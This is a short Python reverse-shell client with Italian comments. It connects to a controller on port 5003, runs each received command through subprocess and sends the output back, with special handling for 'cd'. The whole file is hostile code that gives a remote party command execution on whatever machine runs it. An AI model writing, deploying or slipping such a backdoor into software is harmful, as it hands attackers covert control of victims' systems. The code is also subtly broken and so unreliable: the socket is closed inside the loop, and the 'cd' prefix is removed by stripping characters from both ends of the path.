import socket,os,subprocess
SERVER_HOST="0.0.0.0"
SERVER_PORT=5003
client_socket = socket.socket()
client_socket.connect((SERVER_HOST,SERVER_PORT))

while True:
    command=client_socket.recv(1024).decode()
    if command.lower()=="exit":
        break
    if command.startswith('cd'):    #gestisco cd perchè subprocess non gestisce nativamente i cambi dir
        try:
            os.chdir(command.strip('cd'))
            client_socket.send('Dir changed'.encode())

        except FileNotFoundError as e:  #mando errore al server
            client_socket.send(str(e).encode())
    else:
        output=subprocess.getoutput(command) #con check_output possiamo generare eccezioni subprocess.CalledProcessError 
                                                #   + restituisce l'output come byte string
        client_socket.send(output.encode())
    client_socket.close()
